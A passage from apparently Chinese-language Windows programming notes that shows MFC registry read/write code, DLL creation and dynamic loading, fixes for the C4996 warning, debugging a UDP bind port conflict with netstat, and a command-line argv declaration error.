class="number">56</span>;</span><br><span class="line">    <span class="comment">//创建注册表</span></span><br><span class="line">    DWORD dwRet = <span class="built_in">RegCreateKey</span>(HKEY_LOCAL_MACHINE,<span class="string">&quot;SOFTWARE\\MYWEIGHT\\admin&quot;</span>,&amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (dwRet != ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;创建注册表失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//写注册表【sizeof(DWORD) = sizeof(LONG) = 4】</span></span><br><span class="line">    dwRet = <span class="built_in">RegSetValueEx</span>(hKey, <span class="string">&quot;weight&quot;</span>, <span class="literal">NULL</span>, REG_DWORD, (<span class="type">const</span> BYTE*)&amp;dwWeight, <span class="built_in">sizeof</span>(DWORD));</span><br><span class="line">    <span class="keyword">if</span> (dwRet != ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;写注册表失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关闭注册表</span></span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCFileDlg::OnBnClickedReadFileReg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 读注册表</span></span><br><span class="line">    <span class="comment">//1 打开注册表</span></span><br><span class="line">    HKEY hKey;</span><br><span class="line">    DWORD dwRet = ::<span class="built_in">RegOpenKey</span>(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\MYWEIGHT\\admin&quot;</span>, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (dwRet != ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;打开注册表失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2 读注册表</span></span><br><span class="line">    DWORD dwWeight;</span><br><span class="line">    DWORD dwType;</span><br><span class="line">    DWORD dwSize;</span><br><span class="line">    dwRet = ::<span class="built_in">RegQueryValueEx</span>(hKey, <span class="string">&quot;weight&quot;</span>, <span class="literal">NULL</span>, &amp;dwType, (BYTE*) &amp; dwWeight, &amp;dwSize);</span><br><span class="line">    <span class="keyword">if</span> (dwRet != ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;读注册表失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关闭注册表</span></span><br><span class="line">    ::<span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line"></span><br><span class="line">    CString strShow;</span><br><span class="line">    strShow.<span class="built_in">Format</span>(<span class="string">&quot;Weight = %d&quot;</span>, dwWeight);</span><br><span class="line">    <span class="built_in">MessageBox</span>(strShow);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="9-4-文件操作的企业级应用"><a href="#9-4-文件操作的企业级应用" class="headerlink" title="9.4 文件操作的企业级应用"></a>9.4 文件操作的企业级应用</h3><ol><li>调试日志【debugview 文件日志：警告日志 错误日志】 5星</li><li>视频存储 4星</li><li>文件传输【CFile 与socket结合使用】 4星</li><li>C语言和MFC的文件操作用途广泛；<code>win32 API</code>少用 ifstream ofstream 3星</li><li>配置文件【windows】 5星</li><li>注册表的操作【病毒 逆向 操作注册表】5星</li></ol><br><h2 id="十-动态链接库"><a href="#十-动态链接库" class="headerlink" title="十 动态链接库"></a>十 动态链接库</h2><h3 id="10-1-DLL技术的概念和意义"><a href="#10-1-DLL技术的概念和意义" class="headerlink" title="10.1 DLL技术的概念和意义"></a>10.1 DLL技术的概念和意义</h3><p>动态链接库技术【Dynamic-link library，DLL】是模块化开发中的一种非常重要的技术，主要特点是动态的完成库的链接与使用。</p><p>整个Windows操作系统使用了大量的动态链接库，如：</p><ul><li>gdi32.dl 绘图</li><li>user32.dll 用户界面有关的函数</li><li>kernel32.dll 内存，线程，进程</li><li>d3d9x_11.dll绘图</li></ul><p><strong>静态库和动态库的区别：</strong></p><ol><li>静态链接库在基础课提到过【函数提高3.8：封装自己的SDK】，是程序编译时完成链接，且库的二进制代码包含在项目代码中；</li><li>而动态链接库，用于模块化编程，是在程序运行时完成链接。即在代码运行时，动态加载动态库。</li></ol><p><strong>DLL技术的意义：</strong></p><ul><li>模块化</li><li>方便更新送代：只需要变更动态库版本</li><li>提高代码共享与利用率</li><li>节约内存：动态库不一定被调用；且动态库被调用多次时，内存中只存在一份</li><li>本地化支持：相当于切换不同的动态链接库，如中文包和英文包</li><li>跨语言编程：如与JAVA结合</li><li>解决版本问题：在不同操作系统下，调用相应版本的动态库即可</li><li>特别作用：在制作外挂时，强制给程序新增功能，即强制链接动态库</li></ul><br><h3 id="10-2-创建一个动态链接库"><a href="#10-2-创建一个动态链接库" class="headerlink" title="10.2 创建一个动态链接库"></a>10.2 创建一个动态链接库</h3><p>VS新建项目，在【C++ | Windows】下，有动态链接库的选项，创建项目。本质上就一个核心文件<code>dllmain.cpp</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//入口点函数   APIENTRY：__stdcall</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提供一个求平均的功能【实际上，并不知道有这个函数，故需要做导出】</span></span><br><span class="line"><span class="comment">//int ave(int a, int b)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    return (a + b) / 2;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">// 将ave函数加入DLL导出表</span></span><br><span class="line"><span class="comment">//默认按C++的方式命名函数【C++有重载，故会在函数名中添加很多标志】如：ave@@YYN</span></span><br><span class="line">_declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按C的方式命名函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">ave1</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//强制为_stdcall的调用方式，这样也会自动修改函数名，如ave2@8</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> _stdcall <span class="title">ave2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a + b) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他文件：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mdll.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="comment">//给使用者看的 | 或者创建def文件【项目|添加|代码：模块定义文件def】</span></span><br><span class="line">_declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">ave</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Source.def</span></span><br><span class="line">LIBRARY</span><br><span class="line"></span><br><span class="line">EXPORTS</span><br><span class="line">    ave</span><br></pre></td></tr></table></figure><br><h3 id="10-3-调用动态链接库"><a href="#10-3-调用动态链接库" class="headerlink" title="10.3 调用动态链接库"></a>10.3 调用动态链接库</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*FAVE_1)</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hMod = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;WinDLL.exe&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hMod)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;模块加载成功&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;模块加载失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FAVE_1 func1 = (FAVE_1)<span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;ave1&quot;</span>);<span class="comment">//返回函数指针</span></span><br><span class="line">    <span class="keyword">if</span> (func1)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;函数加载成功&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; <span class="built_in">func1</span>(<span class="number">2</span>, <span class="number">6</span>) &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">FreeLibrary</span>(hMod);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><h2 id="十一-报错处理、调试方法及其他"><a href="#十一-报错处理、调试方法及其他" class="headerlink" title="十一 报错处理、调试方法及其他"></a>十一 报错处理、调试方法及其他</h2><h3 id="11-1-C4996"><a href="#11-1-C4996" class="headerlink" title="11.1 C4996"></a>11.1 C4996</h3><p>遇到过的C4996：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4.2节</span></span><br><span class="line">error C4996: <span class="string">&#x27;localtime&#x27;</span>: This function <span class="keyword">or</span> variable may be unsafe. Consider <span class="keyword">using</span> localtime_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">error C4996: <span class="string">&#x27;sprintf&#x27;</span>: This function <span class="keyword">or</span> variable may be unsafe. Consider <span class="keyword">using</span> sprintf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help <span class="keyword">for</span> details.</span><br></pre></td></tr></table></figure><p>解决：头文件添加<code>#pragma warning(disable:4996)</code>就可以解决。参考</p><p><strong>原因分析：</strong></p><p>  创建项目时，会有一个勾选项，叫做“安全开发生命周期（SDL）检查”，这个东西是微软在VS2012新推出的东西，为了是能更好的监管开发者的代码安全，如果勾选上这一项，那么他将严格按照SDL的规则编译代码，会有一些以前常用的函数无法通过编译，比如在VS2010中的scanf是warning那么在VS2012中就是error了。</p><blockquote><p>有一种说法：出现<code>error C4996</code>的问题，是因为用的是windows系统，在linux下不会报错。</p></blockquote><p><strong>解决方案：</strong></p><ol><li>头文件添加 <code>#pragma warning(disable:4996)</code></li><li>在程序的首行添加 <code>#define _CRT_SECURE_NO_WARNINGS</code>【只能放在程序首行】</li><li>在项目处右键点击找到属性，点击配置属性，【C/C++ | SDL检查： 改成否】</li><li>项目 | 项目属性 | C/C++ | 预处理器定义，添加：<code>_CRT_NONSTDC_NO_DEPRECATE</code>和<code>_CRT_SECURE_NO_WARNINGS</code></li><li>项目 | 项目属性 | C/C++ | 所有选项：禁用特定警告【填写4996】</li></ol><blockquote><p>以上4种方案，亲测全部有效（win7、vs2015）</p></blockquote><br><h3 id="11-2-UDP服务端bind错误的调试方法"><a href="#11-2-UDP服务端bind错误的调试方法" class="headerlink" title="11.2 UDP服务端bind错误的调试方法"></a>11.2 UDP服务端<code>bind</code>错误的调试方法</h3><blockquote><p>针对<code>3.4.2</code>节中的服务端bind错误，调试方法如下</p></blockquote><ul><li>首先修改代码，打印错误号：【<code>WSAGetLastError()函数获取错误号</code>】【得到错误号<code>10048</code>】</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span><span class="comment">//printf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;UDP Server\n&quot;</span>);</span><br><span class="line">    <span class="comment">//0 初始化网络库</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">1</span>, <span class="number">1</span>), &amp;wsaData) != <span class="number">0</span>)<span class="comment">//2 2 表示WinSock2.h的二版本</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;WSAStartup() error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">1</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">1</span>)<span class="comment">//2表示WinSock2.h的二版本</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//存储时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1 创建socket</span></span><br><span class="line">    SOCKET  sockServ = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="number">0</span>);<span class="comment">//udp ipv4</span></span><br><span class="line">    <span class="keyword">if</span> (sockServ == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Server socket Error!&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//errno：10093【应用程序没有调用 WSAStartup，或者 WSAStartup 失败】</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 bind 分配地址和端口</span></span><br><span class="line">    SOCKADDR_IN addrServ, addrClient;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrServ, <span class="number">0</span>, <span class="built_in">sizeof</span>(addrServ));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrClient, <span class="number">0</span>, <span class="built_in">sizeof</span>(addrClient));</span><br><span class="line">    <span class="type">int</span> szAddrCnt = <span class="built_in">sizeof</span>(addrClient);</span><br><span class="line"></span><br><span class="line">    addrServ.sin_family = AF_INET;</span><br><span class="line">    addrServ.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">    addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">6001</span>);</span><br><span class="line">    <span class="type">int</span> ret = <span class="built_in">bind</span>(sockServ, (sockaddr*)&amp;addrServ, <span class="built_in">sizeof</span>(addrServ));</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == ret)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;Bind ERROR:%d\n&quot;,WSAGetLastError());</span></span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Bind ERROR&quot;</span>, <span class="built_in">WSAGetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3 等待收发数据【阻塞】[直接接到服务端socket]</span></span><br><span class="line">    <span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> sendBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Wait Message:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">recvfrom</span>(sockServ, recvBuf, <span class="built_in">sizeof</span>(recvBuf), <span class="number">0</span>, (sockaddr*)&amp;addrClient, &amp;szAddrCnt);</span><br><span class="line">        std::cout &lt;&lt; recvBuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sprintf_s</span>(sendBuf, <span class="built_in">sizeof</span>(sendBuf), <span class="string">&quot;Ack: %s\n&quot;</span>, recvBuf);</span><br><span class="line">        <span class="built_in">sendto</span>(sockServ, sendBuf, <span class="built_in">strlen</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (sockaddr*)&amp;addrClient, szAddrCnt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//7 关闭总机</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sockServ);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 基于当前系统的当前日期/时间</span></span><br><span class="line">    <span class="type">time_t</span> now = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    tm* ltm = <span class="built_in">localtime</span>(&amp;now);</span><br><span class="line">    <span class="built_in">sprintf</span>(strtime, <span class="string">&quot;%2d:%2d:%2d&quot;</span>, ltm-&gt;tm_hour, ltm-&gt;tm_min, ltm-&gt;tm_sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message, <span class="type">int</span> ERRNO)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(message, stderr);</span><br><span class="line">    <span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="comment">//printf(&quot;Error num = %d, Error time %s\n&quot;, ::GetLastError(), ch);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error num = %d, Error time %s\n&quot;</span>, ERRNO, ch);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>在【工具：错误查找】中查找错误代码<code>10048</code>：通常每个套接字地址(协议/网络地址/端口)只允许使用一次。</p></li><li><p>验证：【cmd：<code>Netstat -ano</code>】获取网络端口占用情况</p><p><img src="./11-1.png"></p></li></ul><blockquote><p><code>netstat</code> 命令用于显示各种网络相关信息，如网络连接，路由表，接口状态 (Interface Statistics)，masquerade 连接，多播成员 (Multicast Memberships) 等等。</p></blockquote><ul><li><p>验证：在任务管理器中寻找<code>PID=6696</code>的进程</p><p><img src="./11-2.png"></p></li></ul><br><h3 id="11-3-程序内获取命令行参数出错"><a href="#11-3-程序内获取命令行参数出错" class="headerlink" title="11.3 程序内获取命令行参数出错"></a>11.3 程序内获取命令行参数出错</h3><blockquote><p>windows下，VS调试命令行程序，可以在【属性 | 调试 | 命令行参数】处设置传入的命令行参数</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Must input two args[Start in CMD]\n&quot;</span>);</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//szName = arg[1];//注意下面的写法</span></span><br><span class="line">        <span class="comment">//printf(&quot;%s&quot;, argv);</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;NAME:&quot;</span> &lt;&lt; argv[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Client begin:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解决</strong>：修改<code>char* argv</code> 为指针数组</p><ul><li><code>argc</code>（argument count）：表示命令行参数的数量，包括程序名称本身。</li><li><code>argv</code>（argument vector）：是一个指向指针数组的指针，其中每个指针指向一个表示命令行参数的C字符串。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 